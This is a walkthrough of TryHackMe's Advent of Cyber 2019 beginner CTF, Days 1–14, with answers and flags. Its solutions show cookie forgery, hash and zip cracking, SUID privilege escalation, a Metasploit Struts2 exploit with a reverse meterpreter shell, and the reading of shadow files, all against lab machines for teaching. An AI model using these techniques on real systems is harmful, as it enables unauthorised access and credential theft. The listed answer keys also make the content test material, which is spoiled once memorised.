#  [TryHackMe](https://tryhackme.com/)  Module [Advent of Cyber 1 (2019)](https://tryhackme.com/room/25daysofchristmas)

## Task 1  Introduction

![](https://tryhackme.com/img/events/christmas/tree.png)

**[The Story]**  
  

Just before the lead up to Christmas, Santa’s company(The Best Festival Company) has been compromised by his nemesis(The Christmas Monster). Luckily, one of Santa’s elf team have a background in security. Can they recover all their systems before the lead up to Christmas?

  
It’s the evening of 30th November - the air in the arctic circle is filled with excitement, as every year. This year has been even smoother than previous years - Santa’s digitalisation program has made lives easier for everyone in the company. Elf McElferson, the CTO of the arctic circle, starts doing a couple of last minute checks; everything has to be operating successfully running up to Christmas. With her warm hot chocolate next to his desk, all she needs to do is open the health dashboard and grin at all the green lights. She enters the URL on the dashboard and leans in closer to the screen, anxiously waiting for confirmation. The page loads faster than expected and she gets the initial glimpse of all green. Wait, the first indicator moves to red, and every other one follows the same.

  
In less than a minute, she and all her colleagues receive the following email:

  

`Hey Crew! We know that this is the busiest time of your year. What a shame though - it looks like all of you are locked out of your systems and can’t do any work. Boo hoo for Christmas Santa’s Fav Nemesis, Christmas Monster`

  
McElferson jumps out of her seat and yells. This cannot be happening. How is she supposed to fix this - it’s only 25 days till Christmas and no one can do anything. She goes to the only person who knows about security on his team, Elf McSkidy(you), and asks them to use their l33t skills to fix this. They clearly have a big task ahead of themselves.


A new task will be revealed ever day, where each task will be independent from the previous one. These challenges will cover the following topics:

-   Linux Security
-   Web Application Security
-   Network Security
-   Reverse Engineering
-   Forensics

The challenges are designed for beginners and assume no previous knowledge of security. For more information on Prizes, Swag and event details please check out the [Christmas page](https://tryhackme.com/christmas).

By completing these challenges, you give your consent to give your email to CompTIA (the competition sponsors)


## Task 2  Connect To Our Network

![](https://i.imgur.com/MouaHym.png)  

When you deploy a machine on TryHackMe, you will need to be connected to our network using an OpenVPN client.

For information on connecting to our network and downloading your connection pack can be found on the [access page](https://tryhackme.com/access).

If you have problems connecting, please email us or ask on the [Discord](https://discord.gg/GzVZtGX)!

## Task 3  Points don't matter

![](https://i.imgur.com/j4XGTXr.png)  

In this competition, points do not matter. Your leaderboard rank will not affect you.

For each task you get correct, you get a raffle ticket. On the 26th December we will choose the winners randomly using everyone's raffle tickets.

Also, everyday you complete a challenge, you get entered into another prize draw, for the chance to win a mini-prize. The 'Daily Prizes' are done at the end of the week.

## Task 4  Our Socials

![](https://i.imgur.com/d64bltq.png)](https://discord.gg/GzVZtGX)  

Be a part of our growing community and join our discord!  
  

![](https://i.imgur.com/ACdReyI.png)](https://twitter.com/RealTryHackMe)

Follow us on Twitter to receive daily challenge posts.  
  
We will choose a random winner everyday, to enter simply complete the challenge released on that day. All winners will be announced via Twitter.

## Task 5  [Optional] Your own Kali Linux Machine

![](https://i.imgur.com/9ud3xbm.png)](https://tryhackme.com/room/kali)  

If you don't have the right desktop environment or security tools on your computer, you can deploy and access your own [Kali](https://tryhackme.com/room/kali) Linux machine directly in your browser. This also removes the need to be connected to our OpenVPN server! 

_You need to be subscribed to do this._ 

If you don't want to subscribe, each task will run through the tools needed and how to set them up on your local machine.

## Task 6  [Day 1] Inventory Management

![](https://i.imgur.com/aRLtv7m.gif)  

Elves needed a way to submit their inventory - have a web page where they submit their requests and the elf mcinventory can look at what others have submitted to approve their requests. It’s a busy time for mcinventory as elves are starting to put in their orders. mcinventory rushes into McElferson’s office.

  

I don’t know what to do. We need to get inventory going. Elves can log on but I can’t actually authorise people’s requests! How will the rest start manufacturing what they want. 

McElferson calls you to take a look at the website to see if there’s anything you can do to help. Deploy the machine and access the website at **http://<your_machines_ip>:3000** - it can take up to 3 minutes for your machine to boot!

Supporting material for the challenge is [here](https://docs.google.com/document/d/1PHs7uRS1whLY9tgxH1lj-bnEVWtXPXpo45zWUlbknpU/edit?usp=sharing)!

**Answer the questions below**

Q1: What is the name of the cookie used for authentication?
A authid
**Solution**
When you go to the page there you can see the page like this 

![Task1login](https://user-images.githubusercontent.com/85181215/134501778-bc1d1947-d16c-46e4-b8f9-0d7b439d91e6.png)

There you can see you have to login to the account but you don't know the credentials so you can make your own account on the register section so go there and they are something like this

![Task1Register](https://user-images.githubusercontent.com/85181215/134501831-ffd66051-92b4-4e36-ac2a-e78773e889fd.png)

You can fill the forum with any values you want and login into that account.

![Task1Inventory](https://user-images.githubusercontent.com/85181215/134501921-c843a0fd-380a-433f-b69e-efc0663a8769.png)

Now you login so we can see the cookie of the user we own so i'm using chrome browser if you are using something else search how to view cookie in that browser.In Chrome go to the search bar/URL bar

![Task1InventoryCokkie1](https://user-images.githubusercontent.com/85181215/134501989-af5a26da-ea6d-4978-9d28-9e37396c3954.png)

Click on `Not Secure` 

![Task1InventoryCokkie2](https://user-images.githubusercontent.com/85181215/134502025-8e747650-0114-4b5f-9a5d-f1232a216795.png)

Click on Cookies and you got the cookie and there values 

![Task1InventoryCokkie3](https://user-images.githubusercontent.com/85181215/134502089-c2997622-4401-4dd8-8d6f-418e25f7b4cf.png)

Q2: If you decode the cookie, what is the value of the fixed part of the cookie?
A: v4er9ll1!ss
**Solution**
Copy the cookie value of whatever they are they are encoded with **base64** encoding so we can decode it with base64 decoder on kali linux or also we can use online website also from here i use Kali 
```
$ echo 'cookie here' | base64 -d
```
This will decode that cookie and we can see there cookie first contain our username that we input on register section and then they have some fix input and that our answer

Q3: After accessing his account, what did the user mcinventory request?
A: firewall
**Solution**
From previous question we see the server give a cookie in base64 encoded and there format is like this 
```
[username][fixstring]
```
So by knowing this we can abuse this to get the mcinventory account with knowledge we have like 
```
mcinventory[fixstring here]
```
If we are able to put that cookie in our request we can easily able to login into mcinventory user and we can do this with burp suit but i'm not do that i'm registering an other account with random email and password but use username `mcinventory` there and when i login into that account and we can login into *mcinventory* user and there we can see the mcinventory reguest

![Task1RegisterMcinventory](https://user-images.githubusercontent.com/85181215/134502163-ad897d73-4fa3-4fd6-b696-3b451e53e894.png)

## Task 7  [Day 2] Arctic Forum

![](https://i.imgur.com/e03Ta3j.png)  

A big part of working at the best festival company is the social live! The elves have always loved interacting with everyone. Unfortunately, the christmas monster took down their main form of communication - the arctic forum! 

Elf McForum has been sobbing away McElferson's office. _How could the monster take down the forum!_ In an attempt to make McElferson happy, she sends you to McForum's office to help. 

**P.S. Challenge may a take up to 5 minutes to boot up and configure!**

Access the page at http://[your-ip-here]:3000

Check out the supporting material [here](https://docs.google.com/document/d/1622ejYtCmLOS0zd16CyfhA1xgQk8l55gYWMY8fnpHfQ/edit?usp=sharing)!

**Answer the questions below**

Q1: What is the path of the hidden page?
A: /sysadmin
**Solution**
To get the hidden page of the web we can use any directory scanning tool in my case i use `ffuf` because of its fast speed and i use wordlist `directory-list-2.3-small.txt` with the following command 
```
$ ffuf -w ./wordlist/directory-list-2.3-small.txt:FUZZ -u http://Machine_IP:3000 -ic 
```
This will show so many hidden directory/pages but there is two pages that have status code 200 and one of them are the answer or you can filter ffuf result with only show status code 200 with the switch `-fc 200` so this will show you only the result that have status 200 so one of them is your answer 

Q2: What is the password you found?
A: defaultpass
**Solution**
Now we have access to the hidden page and they are admin panel there we can login to the admin account 
But we have to find valid admin credential to solve that so when i see the source code of that page there is some interesting comment 

![Task2SourceCode](https://user-images.githubusercontent.com/85181215/134502246-e02b0c98-7034-4e8e-88ae-c40b0a97f8c6.png)

That give us a clue of who made this admin panel so when we search that Repo in google found the following

![Task2Repo](https://user-images.githubusercontent.com/85181215/134502286-e614400e-5a52-4ae7-9d99-e8ca09f82bc3.png)

In that repo we found the valid credential.  
Q3: What do you have to take to the 'partay'
A: Eggnog
**Solution**
After login into admin page there is text box there we found the solution of the above question

## Task 8  [Day 3] Evil Elf

![](https://i.imgur.com/Tjpbxgq.png)

An Elf-ministrator, has a network capture file from a computer and needs help to figure out what went on! Are you able to help?

Supporting material for the challenge can be found [here](https://docs.google.com/document/d/1ZVsOtW7mM-4neZZ4QtYCEp__exiMrvlUCXTxhB-zyxk/edit?usp=sharing)!

**Answer the questions below**

Q1: Whats the destination IP on packet number 998?
A: 63.32.89.195
**Solution**
Download `Evil Elf.pcap` file and open it in wireshark now there is lot of packet and scroll down all they way to packet no 998 and there you found the the destination IP Address

![Task3Packet](https://user-images.githubusercontent.com/85181215/134502326-b1b8a0a7-d189-4548-af5d-7d7a782692dc.png)

Q2: What item is on the Christmas list?
A: ps4
**Solution**
Now in the filter bar type `Telnet` and press enter this will filter out all the packet and show you only telnet packet there and only three packets are there so right click on the first packet and they will open a drop down menu and then hover into Follow and then select `Follow TCP stream` and you will see two command there first one have the answer

![Task3Shadow](https://user-images.githubusercontent.com/85181215/134502350-4346632c-5965-4691-bd19-2e724d47e54f.png)

Q3: Crack buddy's password!
A: rainbow
**Solution**
In the previous step we see attacker use cat command to see the content of the shadow file there we can see the buddy user so now we can crack its hash with john or hashcat but im my case i use john. So first copy that hash and save its to a file for example that name is `hash.txt` so we can use the `rockyou.txt` wordlist file to crack that hash with the following command
```
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![Task3Cracked](https://user-images.githubusercontent.com/85181215/134502389-140815e7-0ef6-446a-8dd3-f281806223f8.png)

After the cracking is finish we can see the cracked password there

## Task 9  [Day 4] Training

![](https://i.imgur.com/yHpBtpX.png)  

With the entire incident, McElferson has been _very_ stressed.

_We need all hands on deck now_  

To help resolve things faster, she has asked you to help the new intern(mcsysadmin) get familiar with Linux.   
Access the machine via SSH on port 22 using the command

ssh mcsysadmin@[your-machines-ip]

username: mcsysadmin  
password: bestelf1234

Check out the supporting material [here](https://docs.google.com/document/d/1CpwM_MdHgRqlPSe4eCC_-rVgi8F1xh88PKOySTRSkxU/edit?usp=sharing)

**Answer the questions below**

Q1: How many visible files are there in the home directory(excluding ./ and ../)?
A: 8
**Solution**
Use `ls` command when you login with `ssh` this will show you all the file in the home directory

Q2: What is the content of file5?
A: recipes
**Solution**
Use `cat file5` command to see the content of file5.

Q3: Which file contains the string ‘password’?
A: file6
**Solution**
Use the following command to get the file that have string password in it
```
for n in {1..8}; do echo file$n && cat file$n | grep password; done
```


Q4: What is the IP address in a file in the home folder?
A: 10.0.0.05
**Solution**
Use ` cat * | grep 10.` this command and they will show you all the content that have `10.` there you can see an IP address   

Q5: How many users can log into the machine?
A: 3
**Solution**
Use `cat /etc/passwd` or  `cat /etc/passwd | grep /bin/bash` command to see the content of `passwd` that contain information about all the users in the system.There you will see three users have shell `/bin/bash` those user can login into system

Q6: What is the sha1 hash of file8?
A: fa67ee594358d83becdd2cb6c466b25320fd2835
**Solution**
Use `sha1sum file8` to get the `sha1` hash of file8

Q7: What is mcsysadmin’s password hash?
A: `$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/`
**Solution**
Use the following command
```
$  find /  -name shadow.bak 2>/dev/null
```
This command search for `shadow` file backup in the system and give you the location where that backup file exist.When you found that use the following command to get the content of that file
```
$ cat /var/shadow.bak
```
There you will see that hash of mcsysadmin user password hash.

## Task 10  [Day 5] Ho-Ho-Hosint

![](https://i.imgur.com/tqUN8eg.png)

Elf Lola is an elf-of-interest. Has she been helping the Christmas Monster? lets use all available data to find more information about her! We must protect _The Best Festival Company!_

Resources available [here](https://blog.tryhackme.com/ho-ho/).

**Answer the questions below**

Q1: What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
Hint: What information can you get from exiftool? Are they using the same Creator name on any social networks... Twitter Perhaps?
A: December 29, 1900
**Solution**
First download the image from tryhackme and also download `exiftool` with the following command
```
$ sudo apt install exiftool
```
When you have both then use the following command to get the metadata of the image that you download from tryhackme
```
$ exiftool thegrinch.jpg
```
there output is like this 
```
ExifTool Version Number         : 12.30
File Name                       : thegrinch.jpg
Directory                       : .
File Size                       : 69 KiB
File Modification Date/Time     : 2021:09:03 14:13:41+05:00
File Access Date/Time           : 2021:09:03 16:23:33+05:00
File Inode Change Date/Time     : 2021:09:03 14:13:41+05:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 10.10
Creator                         : JLolax1
Image Width                     : 642
Image Height                    : 429
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 642x429
Megapixels                      : 0.275
```
As you can see from the creator section they have something like username in it.So we can go [osintframework](https://osintframework.com/) that have many utilities to do open source intelligence from there we can select username section and then select instant username search or some other username search so we know which platform have this username available or which have not.Those who have not available that username that mean some one have that username on that site so we can search for that username in that platform to get some information about that user.
There is also a tool for this name `sherlock` you can install it using `sudo apt install sherlock` that also search for usernames.
There we got that this username(`JLolax1`) is register on `Twitter` so we can go there and there we got the birth date of Lola

Q2: What is Lola's current occupation?
A: Santa's Helpers
**Solution**
From Lola `Twitter` account we also got its current occupation.

Q3: What phone does Lola make?
A: iPhone X
**Solution**
From Lola `Twitter` account `Tweet` we got the phone that Lola makes. 

Q4: What date did Lola first start her photography? Format: dd/mm/yyyy
Hint: How many years ago did she start? Have you tried using the WayBackMachine?
A: 23/10/2014
**Solution**
From Lola `Twitter` account we got Lola Personal website when we go there we don't get anything related to when Lola start Photography so to  know about this we go to the website called **`waybackmachine`** 
[WaybackMachine](https://web.archive.org/)
This is a web site that take snapshots of the web site so we can see how its looks in past.That is like web archive. so when we search Lola website on there we know about the waybackmachine took  65 snapshots between October 23,2019 and July 9,2021

![Task10WayBackMachine](https://user-images.githubusercontent.com/85181215/134502497-1179706e-7cfd-40b9-a007-05759bd44317.png)

So when we check the the snapshots of its website from October 23,2019 we see the following output there

![Task10WayBackMachineSnapshot png ](https://user-images.githubusercontent.com/85181215/134502542-47ea6c5d-bb17-4c9e-9596-7dcc7ff44fcf.png)

There we get Lola start Photography some year back from  October 23,2019 so when we minus that year from 2019 we go the answer 

Q5: What famous woman does Lola have on her web page?
A: Ada Lovelace
**Solution**
In Lola website all snapshots have one photo common and that is 

![Task10Photo](https://user-images.githubusercontent.com/85181215/134502582-575897a0-f3d4-421b-b601-3027d2262f7b.png)

So we can go to goggle image search for doing reverse image search to get that information about this image there we can paste the url of the image or we can upload the image to get the information


## Task 11  [Day 6] Data Elf-iltration

![](https://i.imgur.com/FGQSk51.png)  

"**McElferson! McElferson! Come quickly!**" yelled Elf-ministrator.

"**What is it** **Elf-ministrator?**" McElferson replies.

"**Data has been stolen off of our servers!**" Elf-ministrator says!

"**What was stolen?**" She replied.

"**I... I'm not sure... They hid it very well, all I know is something is missing**" they replied.

"**I know just who to call**" said McElferson...

Check out the supporting material [here](https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit?usp=sharing).

Challenge and supporting material created by [Sq00ky](https://twitter.com/MrS1n1st3r).

**Answer the questions below**

Q1: What data was exfiltrated via DNS?
A: Candy Cane Serial Number 8491
**Solution**
TryHackme give us pcap file that have intercepted traffic when we open it on the wireshark we can see there is so many DNS request generated and that have some hex encoded value and that are going to `holidaytheif.com` 

![Task11DNS](https://user-images.githubusercontent.com/85181215/134502679-8222f580-f848-456b-ba23-bb794413f59a.png)

So when we decode that hex value using the command 
```
$ echo 'hex value here' | xxd -r -p
```
we can see the exfiltrated data attacker send 

![Task11decode](https://user-images.githubusercontent.com/85181215/134502701-3a12e756-3fbf-4ebf-8b2f-793befb615d2.png)

Q2: What did Little Timmy want to be for Christmas?
A: pentester
**Solution**
Scroll down a little more in wireshark we also see there is some http request also that have some file so we go to wireshark export section to get that file so we can save that file for further forensic 

![Task11http](https://user-images.githubusercontent.com/85181215/134502736-e9f1e106-a408-4be2-8463-bed93f7ef518.png)

![Task11http_export](https://user-images.githubusercontent.com/85181215/134502771-fade2a94-791e-4c08-9bf6-f10bfc84d386.png)

After saving that file we can see there is two files there one is an image and the other is zip file.When we open the image file that are simple tryhackme logo image so we use `steghide` to check if they have some hidden data on it so we use the following `steghide` command 
```
$ steghide extract -sf ./TryHackMe.jpg
```
and give password empty and we got the following output 

![Task11steghide](https://user-images.githubusercontent.com/85181215/134502819-f31b9ce6-1f38-423f-b494-1cc0f541c42e.png)

that save the hidden data on a file name `christmasmonster.txt`.
Now we move to the zip file and there is many text file there but they have a password protected so we use `fcrackzip` tool to crack that zip file password with the following command 
```
$ fcrackzip -b --method 2 -D -p ~/wordlists/rockyou.txt -v christmaslists.zip
```
this give us the following output.  

![Task11fcrackzip](https://user-images.githubusercontent.com/85181215/134502855-658bbda3-55b3-4984-9524-a4042466baee.png)

After trying that password we successfully unzip the files and there is a file that have name `christmaslisttimmy.txt` when we `cat` that file we got the following output

![Task11timmy](https://user-images.githubusercontent.com/85181215/134502895-5ab7a733-5c84-4c43-9e00-e4c8c88d9a80.png)

They have our answer

Q3: What was hidden within the file?
A:  RFC527
**Solution**
In Previous Question we use `steghide` to get the hidden data on the image file we got and they save that data on a file name `christmasmoster.txt`  when we `cat` that file there we got the our answer on second line.

![Task11poem](https://user-images.githubusercontent.com/85181215/134502937-34ad73dc-efc7-4908-abb8-87122cb882a4.png)

## Task 12  [Day 7] Skilling Up

![](https://i.imgur.com/ta3A7cC.png)  

Previously, we saw `mcsysadmin` learning the basics of Linux. With the on-going crisis, `McElferson` has been very impressed and is looking to push `mcsysadmin` to the security team. One of the first things they have to do is look at some strange machines that they found on their network. 

Check out the supporting material [here](https://docs.google.com/document/d/1q0FziVZM3zCWhcgtPpljVPzkBX0fMAh6ebrXVM5rg08/edit?usp=sharing).

**Answer the questions below**

Q1: how many TCP ports under 1000 are open?
Hint: Use -p port_start - port_end to specify a range
A: 3
**Solution**
Nmap Scan Reports
```bash shell
$ nmap -A -T1 -p 1-1000 <IP_Here>  

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 cc:db:ea:a7:b1:3b:76:b1:36:ac:cb:10:6e:77:09:64 (RSA)
|   256 f2:b5:36:f9:fa:16:c8:01:0d:ea:9c:9e:0e:6d:e6:58 (ECDSA)
|_  256 fd:80:d2:50:cb:28:71:27:0c:b8:ed:5d:ff:9d:ce:dc (ED25519)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44515/tcp   status
|   100024  1          48805/udp6  status
|   100024  1          55187/tcp6  status
|_  100024  1          58792/udp   status
999/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.8)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.6.8
|_http-title: Directory listing for /
```

Q2: What is the name of the OS of the host?
A:  Linux
**Solution**
Nmap will not guess the exact OS but the will show you some guesses of OS there you will find the answer

Q3: What version of SSH is running?
A: 7.4
**Solution**
We can see from the above Nmap Scan Result `ssh` version is  `OpenSSH 7.4 (protocol 2.0)`

Q4: What is the name of the file that is accessible on the server you found running?
A: interesting.file
**Solution**
As we can see from scan report there is a `http` service is running on port `999` so when we go to that location in browser using `http://<IP_Address_here>:999` we can see the file that are accessible there.

![Task12HttpServer](https://user-images.githubusercontent.com/85181215/134502984-22bf3176-e0f8-460d-845d-06d10c4e0fac.png)

## Task 13  [Day 8] SUID Shenanigans

![](https://i.imgur.com/O1RVgMd.gif)

Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. The problem is, Holly is a low-privileged user.. can you escalate her privileges and hack your way into the root account?

Deploy and SSH into the machine.  
Username: holly  
Password: tuD@4vt0G*TU

SSH is not running on the standard port.. You might need to nmap scan the machine to find which port SSH is running on.  
nmap _<machine_ip>_ -p _<start_port>_-_<end_port>_

Read the supporting materials [here](https://blog.tryhackme.com/linux-privilege-escalation-suid/).

**Answer the questions below**

Q1: What port is SSH running on?
**Hint: 65534 is the port number.. But can you find out how to login via SSH on this port?**
A: 65534
**Solution**
First Run all port scan in any port scanner but i use nmap with the following command
```shell
$ nmap -p- -v IP_Here
```
After that the output is like this 

![Task13Nmap](https://user-images.githubusercontent.com/85181215/134503040-0b8dc8c7-e4ce-4f05-b377-242f85822714.png)

They show the port that have service running now we can connect to it using the following command 
```shell
ssh holly@IP_Here -p 65534
```

Q2: Find and run a file as _igor_. Read the file /home/igor/flag1.txt
A: THM{d3f0708bdd9accda7f937d013eaf2cd8}
**Solution**
Now when we login to ssh we use `ls` command on `/home/igor` user directory and we see there is a file name `flag1.txt` but we cannot see its content using `cat` command because we have not enough permissions to read it so we find some `SUID` binaries using the following command
```shell
$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
and we get the following output

![Task13SUID](https://user-images.githubusercontent.com/85181215/134503071-dda36fba-cd90-4384-8db9-2cbb610238fa.png)

There we see `find` command have `SUID` bit set and they are owned by `igor` user so we can use it to read `flag1.txt` from its home directory using the following command
```shell
$ find flag1.txt -exec cat {} \;
```
This will show us that flag

Q3: Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
**Hint: It may simply look like a standard Linux binary file.. And no, its not the Nmap binary on the machine.**
A: THM{8c8211826239d849fa8d6df03749c3a2}
**Solution**

From the output of `SUID` we find above we see there is a binary name `/bin/system-control`. When i run it they prompt to run a command and when i use `id` command there.I see they run command as `root` so i run again that binary and use `bash` command so i got the bash shell with `root` privileges so now i use `cat /root/flag2.txt` command to see the root flag.

## Task 14  [Day 9] Requests

![](https://i.imgur.com/WK4nS4g.png)  

 McSkidy has been going keeping inventory of all the infrastructure but he finds a random web server running on port 3000. All he receives when accessing '/' is

`{"value":"s","next":"f"}`

McSkidy needs to access the next page at /f(which is the value received from the data above) and keep track of the value at each step(in this case 's'). McSkidy needs to do this until the 'value' and 'next' data have the value equal to 'end'.  

You can access the machines at the following IP:

-   **10.10.169.100**  
    

Things to note about this challenge:

-   The JSON object retrieved will need to be converted from unicode to ASCII(as shown in the supporting material)
-   All the values retrieved until the 'end' will be the flag(end is not included in the flag)

Check out the supporting material [here](https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/edit?usp=sharing).

**Answer the questions below**

Q:What is the value of the flag?
A:

## Task 15  [Day 10] Metasploit-a-ho-ho-ho

![](https://i.imgur.com/s1LMcBu.png)

Once deployed, the machine **will** take 4 to 5 minutes to boot and configure. Please be patient.

Hi Lindsey here. I've been a great Elf all year, but there was one incident and now I think I'm on Santa's naughty list.

What? You didn't think us elves got presents too? Well we do and we get first pick of the pressies!

Can you help me hack into Santa's system that keeps track of the naughty and nice people to see if I am on it?

![](https://i.imgur.com/ODZrb5R.png)](https://blog.tryhackme.com/metasploit/)

Check out the [blog post](https://blog.tryhackme.com/metasploit/) shown above to help you on this task.

**Answer the questions below**

Q1: Compromise the web server using Metasploit. What is flag1?
A: THM{3ad96bb13ec963a5ca4cb99302b37e12}
**Solution**
Use **msfconsole** with **exploit/multi/http/struts2_content_type_ognl**.Set all the requirement like 'RHOST,RPORT,TARGETURI,LHOST and LPORT' and set payload to **linux/x86/meterpreter/reverse_tcp** and run the exploit they give you meterpreter shell.

When you got that use `shell` command to spawn a shell in meterpreter and there use the command `find / flag1.txt 2>/dev/null` this will show you the directory where they store that flag. use `cat` command to read it

Q2: Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
A: rudolphrednosedreindeer
**Solution**
Now you have access to the shell with meterpreter so now go to the `/home/santa` directory there they store there ssh credential in a file use `cat` command to read it

Q3: Who is on line 148 of the naughty list?
A: Melisa Vanhoose
**Solution**
Now you have Santa SSH credentials so close the meterpreter and login to Santa account using SSH with the following command
```shell
$ ssh santa@IP_HERE 
```
When you login successfully use `ls` command there and you will see a file name `naughty list` use `vi` command to open that list in `vim` editor so you will see the line numbers or you can use `sed` command for just search for specific line number use the following command 
```shell
$ sed '148!d' naughty_list.txt
```

Q4: Who is on line 52 of the nice list?
A: Lindsey Gaffney
**Solution**
Use the same procedure we do in the last question but use file `nice_list.txt` instead of `naughty_list.txt` they are on the same directory

## Task 16  [Day 11] Elf Applications

McSkidy has been happy with the progress they've been making, but there's still so much to do. One of their main servers has some integral services running, but they can't access these services. Did the Christmas Monster lock them out? 

Deploy the machine and starting scanning the IP. **The machine may take a few minutes to boot up.** 

Check out the supporting material [here](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#).

**Answer the questions below**

Q1: What is the password inside the creds.txt file?
Hint: NFS
A: securepassword123
**Solution**
Use the following command to check if there is any `NFS` share exits
```shell
$ showmount -e IP_Here
```
So that command show me a share so i mount that share to my system using the following command
```shell
$ sudo mount IP_Here:SHARE_PATH /tmp/nfs
```
When i successfully mount that share to my system so i go to the place where i mount that share i.e `/tmp/nfs` so there i see a file name creds.txt that have a password 

Q2: What is the name of the file running on port 21?
A: file.txt
**Solution**
I login to the ftp service using the following command 
```shell
$ ftp Ip_Here

username: anonymous
password:
```
**Note for anonymous user you don't need to give any password just leave him empty and press enter there**
When i login to ftp there i use `ls` command and found `file.txt` file
and i use `get file.txt` command to download that file and when i see its content using `cat` command found MySQL database credential.

Q3: What is the password after enumerating the database?
Hint: SQL
A: bestpassword
**Solution**
So now we have credentials of MySQL so we connect to it using the following command

```shell
$ mysql -h IP_Here -u root -p 
Password: 
```
when we login to the database i use SQL queries to enumerate database
```mysql
mysql>SHOW DATABASES
```
To show all databases 

```mysql
mysql>USE DATA;
```
To use the DATA database 

```mysql
mysql>SHOW TABLES;
```
To show existing tables in database

```mysql 
mysql>SELECT * FROM USERS;
```
to get every thing in the users tables

By Using the above queries i got the admin password

## Task 17  [Day 12] Elfcryption

![](https://i.imgur.com/eYmtdhR.png)

You think the Christmas Monster is intercepting and reading your messages! Elf Alice has sent you an encrypted message. Its your job to go and decrypt it!

Read the supporting materials [here](https://docs.google.com/document/d/1xUOtEZOTS_L8u_S5Fbs1Wof7mdpWQrj2NkgWLV9tqns/edit?usp=sharing).

**Answer the questions below**

Q1: What is the md5 hashsum of the encrypted note1 file?
A: 24cf615e2a4f42718f2ff36b35614f8f
**Solution**
Use the following command
```shell
$ md5sum note1.txt.gpg
```

Q2: Where was elf Bob told to meet Alice?
Hint: gpg key is 25daysofchristmas
A: Santa's Grotto
**Solution**
Use the following command
```shell
$ gpg -d note1.txt.gpg

password: 25daysofchristmas
```

Q3: Decrypt note2 and obtain the flag!
Hint: private password is hello
A: THM{ed9ccb6802c5d0f905ea747a310bba23}
**Solution**
Use the following command
```shell
$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt  -out note2_dcrypted.txt

pass phrase/password: hello
```

## Task 18  [Day 13] Accumulate

![](https://i.imgur.com/kUwtBc8.png)  

mcsysadmin has been super excited with their new security role, but wants to learn even more. In an attempt to show their l33t skills, they have found a new box to play with. 

This challenge accumulates all the things you've learnt from the previous challenges(that being said, it may be a little more difficult than the previous challenges). Here's the general way to attempt exploitation when just given an IP address:

-   Start out with an NMAP scan to see what services are running
-   Enumerate these services and try exploit them
-   use these exploited services to get an initial access to the host machine
-   enumerate the host machine to elevate privileges

Credit to [DarkStar7471](https://tryhackme.com/p/DarkStar7471) for creating this challenge! Not all tasks will include supporting material!

**Answer the questions below**

Q1: A web server is running on the target. What is the hidden directory which the website lives on?
Hint: dirbuster 2.3 medium
A: /retro
**Solution**
Use the following command
```shell
$ ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.195.137/FUZZ -ic 
```

Q2: Gain initial access and read the contents of user.txt
Hint: Don't leave sensitive information out in the open, even if you think you have control over it.
A: THM{HACK_PLAYER_ONE}
**Solution**
After go to the web site `/retro` directory and enumerating all the pages.Found a comment page that have a string looks like some secrets thing like password

![Task18Wadepassword](https://user-images.githubusercontent.com/85181215/134503211-1519d0ee-f6d4-4967-a6b9-0a120e68c9b0.png)

when use that password in web login page with username:`Wade` and password:`parzival` it does't work but from nmap scan report we found a remote desktop port open so i use that credentials there and they work.We got initial access to the system.Now in desktop we can see the `user.txt` flag

Q3: [Optional] Elevate privileges and read the content of root.txt
Hint: Figure out what the user last was trying to find out
A: THM{COIN_OPERATED_EXPLOITATION}
**Solution**
When i open internet browser and see the last search site by the user.Found that user search for a [CVE-2019-1388](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1388) that are use for local privilege escalation using the malicious application when google that vulnerability to know about it more found that [video](https://www.youtube.com/watch?v=3BQKpPNlTSo) useful.In that system that application is available in its desktop and we follow the above video procedure to get admin privileges.After getting the admin privileges we can see the root flag using the following command
```cmd
C:/type C:/User/Administrator/Desktop/root.txt
```


## Task 19  [Day 14] Unknown Storage

![](https://chiefit.me/wp-content/uploads/2019/06/Amazon-Web-Services_logo835x396.png)  

McElferson opens today's news paper and see's the headline

`Private information leaked from the best festival company`

This shocks her! She calls in her lead security consultant to find out more information about this. _How do we not know about our own s3 bucket._ 

McSkidy's only starting point is a single bucket name: **advent-bucket-one**

Check out the supporting material [here](https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#).

**Answer the questions below**

Q1: What is the name of the file you found?
A: employee_names.txt
**Solution**
THM gave us amazon bucket name and that is **advent-bucket-one** so we can search that bucket using the following URL `https://advent-bucket-one.s3.amazonaws.com/` This URL show us the output like following 

![Task19Bucket](https://user-images.githubusercontent.com/85181215/134503262-c028c9f0-ad5e-4b62-a2e7-165efd3234ca.png)

